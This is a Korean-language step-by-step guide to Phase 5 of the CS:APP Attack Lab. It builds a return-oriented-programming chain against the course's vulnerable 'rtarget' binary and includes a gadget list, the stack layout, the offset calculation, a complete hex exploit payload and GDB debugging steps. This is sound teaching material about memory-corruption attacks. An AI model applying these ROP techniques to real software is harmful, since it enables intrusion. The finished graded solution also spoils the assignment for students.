# Attack Lab Phase 5 완전 정복 가이드

## 📋 목차
1. [준비 단계](#준비-단계)
2. [Phase 5 개요](#phase-5-개요)
3. [단계별 해결 방법](#단계별-해결-방법)
4. [도구 사용법](#도구-사용법)
5. [문제 해결](#문제-해결)
6. [GDB 디버깅 팁](#gdb-디버깅-팁)

## 준비 단계

### 1. 서버에서 파일 다운로드

```bash
# 서버 접속
ssh username@165.132.118.201

# 타겟 파일 압축 해제
cd ~
tar xvf targetk.tar
cd targetk

# 파일 확인
ls -la
# 출력: README.txt, ctarget, rtarget, cookie.txt, farm.c, hex2raw
```

### 2. 로컬로 파일 복사 (선택사항)

```bash
# 로컬 머신에서 실행
scp username@165.132.118.201:~/targetk/* ~/projects/cs-as-2/
```

### 3. 필요한 정보 수집

```bash
# Cookie 값 확인
cat cookie.txt
# 예: 0x59b997fa

# rtarget 디스어셈블
objdump -d rtarget > rtarget.d

# 파일 크기 확인
wc -l rtarget.d

# touch3 주소 찾기
grep "touch3>:" rtarget.d
# 예: 00000000004018fa <touch3>:
```

## Phase 5 개요

### 목표
ROP(Return-Oriented Programming) 공격을 사용하여:
1. `touch3` 함수 호출
2. Cookie의 문자열 표현에 대한 포인터를 `%rdi` 레지스터에 전달

### 핵심 도전 과제
- **스택 랜덤화**: 고정 주소 사용 불가
- **실행 불가 스택**: 코드 인젝션 불가
- **동적 주소 계산**: `%rsp` 기반으로 문자열 주소 계산 필요
- **복잡한 ROP 체인**: 8개의 가젯 필요

### Phase 4와의 차이

| 항목 | Phase 4 | Phase 5 |
|------|---------|---------|
| 목표 함수 | touch2 | touch3 |
| 인자 타입 | 정수 (cookie 값) | 문자열 포인터 |
| 필요한 가젯 | 2개 | 8개 |
| 복잡도 | 낮음 | 높음 |
| 주소 계산 | 불필요 | 필수 |

## 단계별 해결 방법

### Step 1: Cookie를 문자열로 변환

Cookie 값(예: `0x59b997fa`)을 ASCII 문자열로 변환해야 합니다.

**도구 사용:**
```bash
python3 cookie_to_string.py 0x59b997fa
```

**출력 예시:**
```
Cookie string: "59b997fa"
Hex bytes: 35 39 62 39 39 37 66 61 00
```

**수동 변환:**
- `'5'` → `0x35` (ASCII)
- `'9'` → `0x39`
- `'b'` → `0x62`
- `'9'` → `0x39`
- `'9'` → `0x39`
- `'7'` → `0x37`
- `'f'` → `0x66`
- `'a'` → `0x61`
- `'\0'` → `0x00` (null terminator)

### Step 2: 필요한 가젯 찾기

**도구 사용:**
```bash
python3 find_gadgets.py rtarget.d
```

이 스크립트는 `start_farm`과 `end_farm` 사이에서 다음 가젯들을 찾아줍니다:

#### 필요한 가젯 목록:

1. **`movq %rsp, %rax`** (48 89 e0 c3)
   - 현재 스택 포인터를 %rax에 저장

2. **`movq %rax, %rdi`** (48 89 c7 c3)
   - %rax의 값을 %rdi로 복사

3. **`popq %rax`** (58 c3)
   - 스택에서 8바이트를 꺼내 %rax에 저장

4. **`movl %eax, %edx`** (89 c2 c3)
   - %eax를 %edx로 복사 (상위 32비트 제거)

5. **`movl %edx, %ecx`** (89 d1 c3)
   - %edx를 %ecx로 복사

6. **`movl %ecx, %esi`** (89 ce c3)
   - %ecx를 %esi로 복사

7. **`lea (%rdi,%rsi,1),%rax`** (48 8d 04 37 c3)
   - %rdi + %rsi의 결과를 %rax에 저장

8. **`movq %rax, %rdi`** (48 89 c7 c3)
   - 최종 결과를 %rdi에 저장

**가젯이 숨어있을 수 있습니다!**

예를 들어, 다음과 같은 명령어에서:
```
400f15: c7 07 d4 48 89 c7  movl $0xc78948d4,(%rdi)
400f1b: c3                 retq
```

바이트 `48 89 c7 c3`는 `movq %rax, %rdi; ret`를 나타냅니다!
따라서 주소 `0x400f18`이 유효한 가젯 주소가 됩니다.

### Step 3: ROP 체인 구조 이해

```
Stack Layout:
+------------------+  <- getbuf의 buf 시작
| 00 00 ... (40)   |  버퍼 채우기
+------------------+  <- saved %rip (리턴 주소)
| Gadget 1 addr    |  movq %rsp, %rax
+------------------+  <- %rsp (Gadget 1 실행 시)
| Gadget 2 addr    |  movq %rax, %rdi
+------------------+
| Gadget 3 addr    |  popq %rax
+------------------+
| Offset (0x48)    |  문자열까지의 오프셋 (72 bytes)
+------------------+  <- %rsp (popq 후)
| Gadget 4 addr    |  movl %eax, %edx
+------------------+
| Gadget 5 addr    |  movl %edx, %ecx
+------------------+
| Gadget 6 addr    |  movl %ecx, %esi
+------------------+
| Gadget 7 addr    |  lea (%rdi,%rsi,1),%rax
+------------------+
| Gadget 8 addr    |  movq %rax, %rdi
+------------------+
| touch3 addr      |  최종 목적지
+------------------+
| padding...       |
+------------------+
| Cookie string    |  "59b997fa\0"
+------------------+
```

### Step 4: 오프셋 계산

문자열이 저장될 위치까지의 오프셋을 계산해야 합니다.

**계산 방법:**

Gadget 1 (`movq %rsp, %rax`) 실행 후:
- `%rsp`는 Gadget 2의 주소를 가리킴
- 문자열은 touch3 주소 다음에 위치

```
거리 계산:
- Gadget 2 ~ touch3: 8개 주소 × 8 bytes = 64 bytes
- touch3 ~ 문자열 시작: 8 bytes (touch3 주소)
- 총: 64 + 8 = 72 bytes (0x48)
```

**주의**: 이 값은 가젯 배치에 따라 달라질 수 있습니다!

### Step 5: Exploit 파일 생성

**자동 생성:**
```bash
python3 generate_exploit.py
```

대화형으로 정보를 입력하면 `exploit_phase5.txt` 파일이 생성됩니다.

**수동 작성:**

```
/* Buffer (40 bytes) */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Gadget addresses (리틀 엔디안!) */
06 1a 40 00 00 00 00 00  /* movq %rsp, %rax */
a2 19 40 00 00 00 00 00  /* movq %rax, %rdi */
ab 19 40 00 00 00 00 00  /* popq %rax */

/* Offset */
48 00 00 00 00 00 00 00  /* 72 bytes */

/* More gadgets */
dd 19 40 00 00 00 00 00  /* movl %eax, %edx */
34 1a 40 00 00 00 00 00  /* movl %edx, %ecx */
13 1a 40 00 00 00 00 00  /* movl %ecx, %esi */
d6 19 40 00 00 00 00 00  /* lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00  /* movq %rax, %rdi */

/* touch3 */
fa 18 40 00 00 00 00 00  /* touch3 address */

/* Cookie string */
35 39 62 39 39 37 66 61 00
```

**중요 사항:**
1. 주소는 **리틀 엔디안** 형식으로
2. 0x0a (newline) 포함 금지
3. 문자열은 null로 종료

### Step 6: 테스트 및 실행

```bash
# 1. hex2raw로 변환
./hex2raw < exploit_phase5.txt > exploit_phase5_raw.txt

# 2. 빠른 테스트
./rtarget -i exploit_phase5_raw.txt

# 3. GDB로 디버깅 (중요!)
gdb rtarget
(gdb) break getbuf
(gdb) run < exploit_phase5_raw.txt
(gdb) stepi
(gdb) x/40gx $rsp
(gdb) info registers
```

## 도구 사용법

### 1. find_gadgets.py

가젯 팜에서 필요한 가젯을 자동으로 찾아줍니다.

```bash
# rtarget 디스어셈블 (한 번만)
objdump -d rtarget > rtarget.d

# 가젯 찾기
python3 find_gadgets.py rtarget.d

# 출력 예시:
# ✓ start_farm 발견: 0000000000401994 <start_farm>:
# ✓ end_farm 발견: 0000000000401ab2 <end_farm>:
#
# popq %rax:
#   0x4019ab: 58 c3
#
# movq %rsp, %rax:
#   0x401a06: 48 89 e0 ... c3
# ...
```

### 2. cookie_to_string.py

Cookie를 ASCII hex 문자열로 변환합니다.

```bash
# Cookie 값 확인
cat cookie.txt

# 변환
python3 cookie_to_string.py 0x59b997fa

# 출력:
# Cookie string: "59b997fa"
# Hex bytes: 35 39 62 39 39 37 66 61 00
```

### 3. generate_exploit.py

대화형으로 exploit 파일을 생성합니다.

```bash
# 대화형 모드
python3 generate_exploit.py

# 빈 템플릿 생성
python3 generate_exploit.py --template
```

## 문제 해결

### 문제 1: "Segmentation fault"

**원인:**
- 잘못된 가젯 주소
- 스택 정렬 오류
- 잘못된 오프셋

**해결:**
```bash
gdb rtarget
(gdb) break getbuf
(gdb) run < exploit_phase5_raw.txt
(gdb) stepi  # 단계별 실행
(gdb) x/i $rip  # 현재 명령어 확인
(gdb) x/40gx $rsp  # 스택 내용 확인
```

### 문제 2: "Misfire: You called touch3(...)"

**원인:**
- 문자열 포인터가 잘못된 위치를 가리킴
- 오프셋 계산 오류
- 문자열이 덮어씌워짐

**해결:**
```bash
# GDB에서 touch3 진입 시 확인
(gdb) break touch3
(gdb) continue
(gdb) x/s $rdi  # %rdi가 가리키는 문자열 확인
(gdb) x/10bx $rdi  # 바이트 단위로 확인
```

### 문제 3: 가젯을 찾을 수 없음

**해결:**
- 바이트 시퀀스를 16진수 에디터로 직접 검색
- 함수 중간에 숨어있는 가젯 찾기
- 대체 가젯 시퀀스 고려

```bash
# 바이트 패턴으로 직접 검색
grep -i "48 89 e0" rtarget.d
grep -i "48 89 c7" rtarget.d
```

### 문제 4: 오프셋이 맞지 않음

**해결:**

GDB로 실제 오프셋을 계산하세요:

```bash
(gdb) break *0x401a06  # movq %rsp, %rax 가젯
(gdb) run < exploit_phase5_raw.txt
(gdb) ni  # 다음 명령어 실행
(gdb) print $rax  # 스택 포인터 값 확인
(gdb) x/40gx $rax  # 스택 내용 보기

# 문자열의 실제 위치 찾기
(gdb) find $rax, $rax+200, "59b997fa"
# 또는
(gdb) x/200bx $rax  # 수동으로 찾기

# 오프셋 계산: 문자열 주소 - $rax 값
```

## GDB 디버깅 팁

### 기본 명령어

```bash
# GDB 시작
gdb rtarget

# 브레이크포인트 설정
(gdb) break getbuf
(gdb) break touch3
(gdb) break *0x401a06  # 주소에 직접 설정

# 실행
(gdb) run < exploit_phase5_raw.txt

# 단계별 실행
(gdb) stepi   # 한 명령어 실행
(gdb) nexti   # 함수 건너뛰기
(gdb) continue  # 다음 브레이크포인트까지

# 상태 확인
(gdb) info registers        # 모든 레지스터
(gdb) info registers rdi rsi  # 특정 레지스터
(gdb) x/40gx $rsp          # 스택 (8바이트씩 40개)
(gdb) x/80bx $rsp          # 스택 (1바이트씩 80개)
(gdb) x/i $rip             # 현재 명령어
(gdb) x/10i $rip           # 다음 10개 명령어
(gdb) x/s $rdi             # 문자열 출력

# 메모리 검색
(gdb) find $rsp, $rsp+200, 0x59b997fa  # 값 찾기
```

### 유용한 워크플로우

```bash
# 1. 각 가젯 실행을 확인
(gdb) break getbuf
(gdb) run < exploit_phase5_raw.txt

# 2. getbuf 리턴 전
(gdb) x/40gx $rsp
# 첫 번째 가젯 주소 확인

# 3. 각 가젯에 브레이크포인트 설정
(gdb) break *0x401a06  # gadget 1
(gdb) break *0x4019a2  # gadget 2
# ... (모든 가젯)

# 4. 계속 실행하며 레지스터 확인
(gdb) continue
(gdb) info registers
(gdb) continue
(gdb) info registers
# ...

# 5. touch3 진입 시 최종 확인
(gdb) break touch3
(gdb) continue
(gdb) x/s $rdi  # cookie 문자열이 맞는지 확인
```

### 디버깅 체크리스트

- [ ] 버퍼 크기가 정확한가? (보통 40 bytes)
- [ ] 첫 번째 가젯이 실행되는가?
- [ ] %rsp 값이 올바르게 저장되는가?
- [ ] popq가 올바른 값을 로드하는가?
- [ ] 오프셋 계산이 정확한가?
- [ ] lea 명령어가 올바른 주소를 계산하는가?
- [ ] %rdi가 문자열을 가리키는가?
- [ ] 문자열이 손상되지 않았는가?

## 추가 팁

### 1. 리틀 엔디안 변환

주소 `0x401234`를 리틀 엔디안으로:
```
34 12 40 00 00 00 00 00
```

온라인 도구나 파이썬 사용:
```python
addr = 0x401234
bytes_le = addr.to_bytes(8, 'little')
hex_str = ' '.join(f'{b:02x}' for b in bytes_le)
print(hex_str)
# 출력: 34 12 40 00 00 00 00 00
```

### 2. 0x0a 확인

exploit 파일에 0x0a (newline)가 있으면 안 됩니다!

```bash
# 확인
xxd exploit_phase5_raw.txt | grep " 0a"

# 또는
hexdump -C exploit_phase5_raw.txt | grep 0a
```

### 3. 백업 전략

작동하는 exploit을 발견하면 즉시 백업!

```bash
cp exploit_phase5.txt exploit_phase5_working_v1.txt
```

### 4. 점진적 테스트

한 번에 모든 가젯을 테스트하지 말고, 단계별로:

1. 처음 3개 가젯만 (스택 포인터 저장)
2. popq와 오프셋 추가
3. 나머지 가젯 추가
4. touch3 호출

## 성공 메시지

모든 것이 올바르면 다음과 같은 메시지가 나타납니다:

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASSED: Sent exploit string to server to be validated.
NICE JOB!
```

## 체크리스트

해결하기 전에:

- [ ] cookie.txt 확인
- [ ] rtarget 디스어셈블 (`objdump -d rtarget > rtarget.d`)
- [ ] touch3 주소 찾기
- [ ] 가젯 8개 모두 찾기
- [ ] Cookie를 ASCII hex로 변환
- [ ] 오프셋 계산
- [ ] 모든 주소를 리틀 엔디안으로 변환
- [ ] 0x0a 없는지 확인
- [ ] GDB로 테스트
- [ ] 최종 실행

## 참고 자료

- CS:APP3e 교재 Section 3.10.3, 3.10.4
- [x86-64 Instruction Reference](https://www.felixcloutier.com/x86/)
- `man ascii` (ASCII 코드 표)
- `man objdump`, `man gdb`

## 문의

문제가 발생하면:
1. 이 가이드의 문제 해결 섹션 확인
2. GDB로 철저히 디버깅
3. 스택 구조와 레지스터 값 확인

화이팅! 🎯

